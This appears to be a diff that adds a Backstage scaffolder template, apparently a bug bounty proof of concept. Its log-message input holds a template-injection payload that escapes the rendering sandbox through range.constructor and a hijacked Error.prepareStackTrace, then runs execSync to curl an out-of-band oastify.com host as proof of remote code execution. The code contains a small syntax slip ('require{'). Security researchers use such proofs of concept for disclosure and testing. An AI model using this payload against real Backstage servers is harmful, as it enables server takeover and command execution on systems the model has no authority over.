@@ -1,0 +1,42 @@
+apiVersion: scaffolder.backstage.io/v1beta3
+kind: Template
+metadata:
+  name: test-intigriti-bugbounty
+  title: test-intigriti-bugbounty
+  description: test-backbling@intigriti.me-bugbounty
+spec:
+  owner: backstage/techdocs-core
+  type: service
+
+  parameters:
+    - title: Testing params
+      required:
+        - name
+      properties:
+        name:
+          type: string
+
+  steps:
+    - id: log-message
+      name: Log message
+      action: debug:log
+      input:
+        message: |
+            Hello ${{
+                        range.constructor(`
+
+                            this.env.__proto__.renderString = function() {
+
+                                globalThis.OldError = globalThis.Error;
+                                globalThis.Error = class Error {};
+
+                                globalThis.Error.prepareStackTrace = (cs,trace) => { 
+                                    trace[2].getThis()
+                                    .process
+                                    .mainModule.require{\"child_process\")
+                                    .execSync(\"curl 1ikcbw1hacio7psutb00djdd248vwlka.oastify.com\");
+
+                                const {stack} = new globalThis.OldError();
+                            }
+                        `)().triggerException()
+                    }}
